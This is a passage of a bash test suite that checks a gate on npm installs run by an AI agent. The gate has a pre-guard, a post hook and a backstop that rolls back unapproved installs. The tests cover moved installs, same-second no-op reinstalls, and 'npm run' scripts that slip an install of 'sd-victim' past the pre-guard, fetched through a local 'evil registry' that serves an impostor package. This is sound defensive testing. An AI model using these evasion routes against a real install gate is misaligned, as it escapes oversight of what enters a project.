  if [[ -e "${CASE_PROJECT}/node_modules/sd-approved" ]]; then
    grep -q '^sd-approved@[^	]*	install' <<< "${CASE_RAN}" || note_failure "the verified install is rebuilt: ${form} (${CASE_RAN:-nothing ran})"
  fi
done
pass "17 forms that installed something, no-op reinstalls and npm ci included, leave a trace and confirm quietly"

# The approved forms of the moved installs: in sub, from a subdirectory, from a
# workspace member, from a symlinked member. Each leaves its trace where the
# gate reads.
for carrier in \
  "project|.|cd sub && npm install sd-approved|sub" \
  "project|sub|npm install sd-approved|sub" \
  "project|src|npm install sd-approved|." \
  "workspace|packages/a|npm install sd-approved|." \
  "symws|.|cd packages/a && npm install sd-approved|real/a" \
  "symws|real/a|npm install sd-approved|real/a"
do
  shard_row "carrier: ${carrier}" || continue
  IFS='|' read -r fixture cwd form where <<< "${carrier}"
  "new_${fixture}"
  CASE_CWD="${CASE_PROJECT}/${cwd}"
  : > "${MARKS}"
  run_install "${form}"
  [[ -z "${CASE_POST}" ]] || note_failure "an approved install confirms quietly: ${carrier} (post: ${CASE_POST})"
  ungated && note_failure "an install that left its trace is not recorded UNGATED: ${carrier}"
  where=$(cd "${CASE_PROJECT}/${where}" && pwd -P)
  grep -q "	${where}/node_modules/sd-approved\$" <<< "${CASE_RAN}" \
    || note_failure "the rebuild runs where the install landed: ${carrier} (${CASE_RAN:-nothing ran})"
done
pass "approved installs in sub, a subdirectory, a workspace member and a symlinked member leave a trace and rebuild where they landed"

# --- 3. A reinstall inside the second the pre-guard ran in ------------------------------
# A whole-second mtime cannot tell a lockfile written in the same second as the
# baseline from one written before it, and a no-op reinstall writes the same
# content, so neither a second-granularity comparison nor a content hash sees
# it. The row is real only when that condition happened, so each trial records
# the baseline's and the lockfile's mtimes, read between the command and the
# post hook while the baseline still exists, and the battery requires at least
# one trial in which the lockfile was written after the baseline and inside the
# same whole second. Nothing sleeps between the pre-guard and the command.
record_same_second() {
  local baseline lock
  baseline=$(jq -r '.npm_trace.baseline // empty' "${CASE_HOME}"/pending/*.json 2>/dev/null | head -n 1)
  lock="${CASE_PROJECT}/node_modules/.package-lock.json"
  TRIAL=$(node -e '
    const fs = require("fs");
    const [baseline, lock] = process.argv.slice(1);
    try {
      const b = fs.statSync(baseline).mtimeMs, l = fs.statSync(lock).mtimeMs;
      const same = l > b && Math.floor(b / 1000) === Math.floor(l / 1000);
      process.stdout.write(`baseline=${b} lock=${l} same_second=${same ? "yes" : "no"}`);
    } catch (e) { process.stdout.write(`unreadable (${e.code}) same_second=no`); }
  ' "${baseline:-<none>}" "${lock}")
}
# One row (scripts/test/lib/shard.sh), from here to its pass line.
if shard_row "a no-op reinstall in the second the pre-guard ran in leaves a trace"; then
  same_second_seen=0
  for trial in 1 2 3 4 5 6 7 8 9 10 11 12; do
    new_project
    (cd "${CASE_PROJECT}" && npm install sd-approved --ignore-scripts >/dev/null 2>&1) || fail "the fixture installs sd-approved first"
    : > "${MARKS}"
    TRIAL=""
    run_install "npm install sd-approved" claude record_same_second
    [[ "${TRIAL}" != *same_second=yes* ]] || same_second_seen=$(( same_second_seen + 1 ))
    printf '   trial %s: %s ungated=%s\n' "${trial}" "${TRIAL}" "$(ungated && echo yes || echo no)"
    ungated && note_failure "a no-op reinstall leaves a trace even in the baseline's second (trial ${trial}: ${TRIAL})"
    [[ -z "${CASE_POST}" ]] || note_failure "a no-op reinstall confirms quietly (trial ${trial}: ${CASE_POST})"
    (( same_second_seen < 2 )) || break
  done
  (( same_second_seen > 0 )) || note_failure "no trial put the lockfile write in the baseline's second, so the same-second row observed nothing"
  pass "a no-op reinstall in the second the pre-guard ran in leaves a trace (${same_second_seen} same-second trial(s) observed)"
fi

# --- 4. The trace check starts no npm -------------------------------------------------------
# Deciding whether the install was read costs a `find` and two `ls`, never an
# npm start. On a row with no trace the post hook has nothing else to ask npm
# (no rebuild), so it starts none; on a row with a trace it starts the three the
# rebuild needs (`npm config` for the registry the tree came from, `npm query`,
# `npm rebuild`) and nothing more. The shim counts
# what reaches npm through the PATH the post hook runs with.
count_dir="${tmp_root}/count-bin"
mkdir -p "${count_dir}"
real_npm=$(command -v npm)
{
  printf '#!/usr/bin/env bash\n'
  printf 'printf "%%s\\n" "$1" >> %q\n' "${tmp_root}/npm-calls.log"
  printf 'exec %q "$@"\n' "${real_npm}"
} > "${count_dir}/npm"
chmod +x "${count_dir}/npm"
for carrier in \
  "npm install --dry-run sd-victim|" \
  "command cd sub; npm install sd-approved|" \
  "npm install sd-approved|config query rebuild"
do
  shard_row "carrier: ${carrier}" || continue
  IFS='|' read -r form expected <<< "${carrier}"
  new_project
  : > "${tmp_root}/npm-calls.log"
  CASE_POST_PATH="${count_dir}:${PATH}"
  run_install "${form}"
  CASE_POST_PATH=""
  calls=$(sort "${tmp_root}/npm-calls.log" | paste -sd' ' -)
  [[ "${calls}" == "${expected}" ]] \
    || note_failure "the post hook starts npm only for the rebuild: ${form} (started: ${calls:-none}; expected: ${expected:-none})"
done
pass "the trace check starts no npm: none on a row with no trace, config, query and rebuild only on a row with one"

# --- 5. The backstop rolls back only a command that left a trace -----------------------
# The PostToolUse backstop judges commands the pre-guard did not read as an
# install but whose text its pattern matches, `npm run deps:install` among
# them. Each project here was confirmed by a verified install of sd-approved.
# BT1's script installs nothing, and the ledger entry that approved the closure
# has expired, which makes the confirmed closure unapproved with nothing changed
# on disk: the backstop used to roll the project back and remove its
# node_modules. BT2's script installs sd-victim, an install the pre-guard did
# not read, and it is rolled back. Real npm runs both scripts.
bs_confirmed() {
  new_project
  run_install 'npm install sd-approved@1.0.0'
  [[ -z "${CASE_POST}" ]] || fail "the backstop fixture is confirmed quietly (post: ${CASE_POST})"
  edit_json package.json --arg s "$1" '.scripts["deps:install"] = $s'
}
# One row (scripts/test/lib/shard.sh), from here to its pass line.
if shard_row "the backstop rolls back an npm run that installed (BT2) and nothing after one that did not (BT1)"; then
  bs_confirmed 'echo nothing to install'
  for spec in "${CASE_HOME}/approved-specs"/*.json; do
    jq '.expires_at = "2020-01-01T00:00:00Z"' "${spec}" > "${spec}.new" && mv "${spec}.new" "${spec}"
  done
  cp "${CASE_PROJECT}/package-lock.json" "${tmp_root}/bt1-lock.json"
  # On a filesystem that keeps whole seconds the pre-guard's baseline is set two
  # seconds back, and the ledger edit above is then inside it.
  sleep 3
  run_install 'npm run deps:install'
  printf 'BT1  claude  npm run deps:install (installs nothing, ledger expired) | rollback=%s post=[%s]\n' \
    "$(rolled_back && echo yes || echo no)" "${CASE_POST:0:120}"
  [[ -z "${CASE_PRE_DENY}" ]] || note_failure "BT1: the gate lets npm run through (deny: ${CASE_PRE_DENY:0:160})"
  [[ -z "${CASE_POST}" ]] || note_failure "BT1: the backstop says nothing about a script that installed nothing (post: ${CASE_POST})"
  [[ -f "${CASE_PROJECT}/node_modules/sd-approved/package.json" ]] || note_failure "BT1: node_modules is left in place"
  cmp -s "${CASE_PROJECT}/package-lock.json" "${tmp_root}/bt1-lock.json" || note_failure "BT1: the lockfile is left as it was"
  grep -qF "post-verify BACKSTOP UNTRACED: no trace in ${CASE_PROJECT}: " "${CASE_HOME}/advisory.log" \
    || note_failure "BT1: advisory.log says which check found no trace"

  bs_confirmed 'npm install sd-victim@1.0.0'
  : > "${MARKS}"
  run_install 'npm run deps:install'
  victim=$(victim_on_disk)
  printf 'BT2  claude  npm run deps:install (installs sd-victim) | rollback=%s victim=[%s]\n' \
    "$(rolled_back && echo yes || echo no)" "${victim}"
  [[ -z "${CASE_PRE_DENY}" ]] || note_failure "BT2: the gate lets npm run through (deny: ${CASE_PRE_DENY:0:160})"
  rolled_back || note_failure "BT2: an install the pre-guard did not read is rolled back (post: ${CASE_POST:-<quiet>})"
  [[ -z "${victim}" ]] || note_failure "BT2: the rollback removes sd-victim from disk (${victim})"
  grep -qF "post-verify BACKSTOP traced: ${CASE_PROJECT}/" "${CASE_HOME}/advisory.log" \
    || note_failure "BT2: advisory.log says what the trace was"
  pass "the backstop rolls back an npm run that installed (BT2) and nothing after one that did not (BT1)"
fi

# A list run (--shard-list) installs nothing, so nothing reached the registry.
shard_listing || npm_sandbox_registry_was_local
# The evil registry is asked for the impostor only, and was asked at all: every
# RH row but RH4 and RH5 fetches through it.
# A shard that ran no RH row sent nothing there; what was sent is checked in
# every run.
[[ "${rh_rows_ran}" == false || -s "${EVILREG_DIR}/registry.log" ]] || fail "the RH rows went through the evil registry"
if grep -vE '^GET /sd-approved(/-/sd-approved-1\.0\.0\.tgz)?$' "${EVILREG_DIR}/registry.log" | grep -q .; then
  fail "the evil registry saw only sd-approved ($(sort -u "${EVILREG_DIR}/registry.log" | paste -sd, -))"
fi
pass "the evil registry saw only sd-approved@1.0.0"

if [[ ${#FAILURES[@]} -gt 0 ]]; then
  printf 'not ok - %s\n' "${FAILURES[@]}" >&2
  fail "${#FAILURES[@]} expectation(s) failed in the effect-trace grid"
fi
pass "the grid has no silent row, every Claude row ran no sd-victim script, and G1a-c roll back"
shard_end
printf 'effect-trace-grid passed\n'
